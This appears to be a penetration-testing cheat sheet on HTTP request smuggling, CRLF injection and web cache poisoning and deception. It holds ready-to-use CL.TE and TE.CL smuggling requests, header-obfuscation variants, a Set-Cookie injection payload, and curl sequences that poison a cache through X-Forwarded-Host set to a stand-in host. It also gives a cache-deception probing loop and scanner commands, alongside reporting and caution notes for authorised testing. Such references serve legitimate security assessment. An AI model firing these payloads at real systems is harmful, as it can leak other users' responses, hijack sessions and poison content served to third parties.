# Request Smuggling, Desync & Cache Poisoning

## Request smuggling

Two parsers (front-end proxy and back-end origin) disagree about where a request ends. The
attacker sends one request that the front-end sees as two, or the back-end sees as one.

### CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target

```

The front-end forwards 13 bytes; the back-end reads the chunked body (`0` = end of chunked) and
treats the leftover `GET /admin` as a new request.

### TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length)

```http
POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: target
Content-Length: 15

x=1
0

```

### TE.TE (both use Transfer-Encoding, but obfuscated)

```
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\n
Transfer-Encoding:\tchunked
```

Different stacks strip or ignore headers differently — that disagreement *is* the bug.

### Detection

```bash
# probe
curl -sS -i -X POST "https://target/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Transfer-Encoding: chunked" \
  --data-raw $'0\r\n\r\nGET /smuggle-probe HTTP/1.1\r\nHost: target\r\n\r\n'

# systematic CL/TE + TE/CL scanner
pip install smuggler
python3 smuggler.py https://target/ -m CLTE -c 10
```

Look for: a response containing your marker, a duplicated response, a timeout, a 400 from the origin,
or the next request's response leaking into this one.

### Exploitation

1. Confirm the desync (your marker comes back).
2. Establish a **prefix** you control on the back-end connection (poison the queue).
3. Use the queue to: steal another user's response, split a response so you get the other half,
   or make the back-end fetch an attacker-chosen URL (SSRF through the front-end).
4. **Keep it minimal** — one request at a time, `Connection: close` on the back-end request.

Report: front-end behaviour, back-end behaviour, the exact crafted request, and the impact
(another user's response, cache poisoning, SSRF).

## Response splitting / CRLF injection

If user input reaches a response header or body without sanitisation:

```
GET /%0d%0aSet-Cookie:%20admin=true HTTP/1.1
```

Impact: session fixation, cache poisoning, XSS via injected body, header smuggling.

## Cache poisoning

### Detect the cache

```bash
curl -sI https://target/page | grep -iE 'x-cache|cache-status|age|vary|via'
```

Look for `X-Cache: HIT`, `cf-cache-status`, `Age`, `Vary`.

### Unkeyed headers

The cache key usually is `(method, host, path)`. Anything not in that tuple but reflected into the
response is **unkeyed** and will be cached for other users.

Common unkeyed inputs: `X-Forwarded-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-Forwarded-Proto`,
`X-Override-URL`, `X-HTTP-Method-Override`, custom headers, and the `Host` header when the site
serves multiple hosts from one cache.

```bash
# 1. find an unkeyed header
curl -s https://target/page -H 'X-Forwarded-Host: evil.tld' -H 'Cache-Control: no-cache' | grep evil.tld

# 2. poison (cache it)
curl -s https://target/page -H 'X-Forwarded-Host: evil.tld' -o /dev/null

# 3. confirm it hit the cache for a normal request
curl -s https://target/page | grep evil.tld
```

### Web cache deception

Path confusion: the cache stores `/static/app.js` but the app routes `/profile/app.js` to the
profile page — the cache serves the **profile** (with session data) to anyone requesting that path.

```bash
for p in /static/ /assets/ /js/ /css/ /media/; do
  curl -s "https://target${p}../../account" | grep -qi 'account\|profile' && echo "deception: $p"
done
```

### Cache key injection

If the cache key contains the full URL including the query, you can split it:
`/a?b=1&c=2` vs `/a?b=1` — and poison one while reading the other.

### Impact and report

Cache poisoning is high severity when the response is served **with the victim's cookies or
authorisation** — that is session hijack by cache. Report: the unkeyed header, the proof that a
clean request got the poisoned content, and whether authenticated responses are affected.

## HTTP/2 and HTTP/3 specific issues

- **Request smuggling over H2**: h2c upgrade, or H2-to-H1 translation bugs — the classic
  "H2.CL smuggling" where the front-end uses HTTP/2 framing and the origin uses HTTP/1.1.
- **Priority / dependency confusion** (rapid reset, CONTINUATION floods) — availability, out of scope
  for assessment work.
- **H3/QPACK cache-key differences** → the same poisoning class as HTTP/1.

## Practical rules

- Test one variant at a time.
- Always confirm with a **clean** request (no crafted headers) that the effect persisted — that is
  what separates caching from a per-request reflection.
- Do not poison a shared cache with anything harmful; use a benign marker you can attribute.
- Reset what you poisoned where you can, and say what you left behind.
